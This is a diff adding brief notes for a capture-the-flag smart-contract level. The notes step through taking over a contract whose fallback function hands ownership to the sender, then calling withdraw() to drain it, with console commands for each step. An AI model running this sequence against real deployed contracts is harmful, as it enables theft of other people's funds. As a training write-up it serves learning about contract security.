@@ -1,0 +1,14 @@
+withdraw() can only be called by the owner, so we need to become the owner.
+fallback() assigns owner to msg.sender, so lets trigger it.
+
+we need to make a small payment to contribution()
+>> await contract.contribute({ value: 1})
+
+then a small payment to fallback()
+I did this through MetaMask (send to instance address)
+
+check we're now owner
+>> await contract.owner()
+
+pull the rug
+>> await contract.withdraw()
